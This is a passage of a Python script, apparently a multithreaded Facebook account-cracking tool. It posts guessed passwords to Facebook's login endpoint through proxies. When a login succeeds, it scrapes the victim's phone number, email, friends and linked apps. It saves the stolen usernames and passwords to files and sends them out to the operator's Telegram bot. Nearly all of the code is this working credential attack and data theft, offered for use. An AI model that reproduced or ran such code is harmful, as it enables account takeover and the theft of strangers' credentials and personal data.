str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				statuscp = f'''𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺✖️
⋘─────━𓆩مدفوع𓆪‏━─────⋙
﷽ - جيميل : {idf}\n
﷽ - كلمة المرور  : {pw}\n

⋘─────━𓆩مدفوع𓆪‏━─────⋙
BY = @Q_O_O_Z || @N_9_N_6'''
				statuscp1 = nel(statuscp, style='red')
				cetak(nel(statuscp1, title='ZOZO'))
				with open('𝒇𝒂𝒍𝒔𝒆 𝒂𝒄𝒄𝒐𝒖𝒏ᴛ.txt','a')as ZOZO:
					ZOZO.write(f'{statuscp}\n')
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				user=idf
				infoakun = ""
				session = requests.Session()
				get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
				nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
				response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
				response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
				response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
				response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
				try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
				except:nomer = ""
				try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
				except:email=""
				try:
					tahun = ""
					cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
					for nenen in cek_thn:
						tahun += nenen+", "
				except:pass
				infoakun += f'''
⋘─────━𓆩ᏃᏫᏃᏫ𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n<><><><><><><><><><><><><><>\n❖ - Jumlah Teman : {teman}\n❖ - Jumlah Pengikut : {pengikut}\n❖ - Email Aktif : {email}\n❖ - Nomor Aktif : {nomer}\n❖ - Tahun Akun : {tahun}\n❖ - Tanggal Lahir : {ttl}\n
⋘─────━𓆩ᏃᏫᏃᏫ𓆪‏━─────⋙
BY = @Q_O_O_Z || @N_9_N_6'''
				statusok1 = nel(infoakun, style='green')
				cetak(nel(statusok1, title=' ZOZO'))
				cek_apk(kuki)
				with open('𝒈𝒐𝒅 𝒂𝒄𝒄𝒐𝒖𝒏ᴛ.txt','a')as ZOZO:
					ZOZO.write(f'{infoakun}\n')
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))
				break		
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def cek_apk(kuki):
	session = requests.Session()
	headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.system('touch .prox_ZOZO.txt')
	except:pass
	login()
	Threads=[] 
for t in range(35):
 x = threading.Thread(target=passwrd)
 x.start()
 Threads.append(x)
for Th in Threads:
 passwrd()
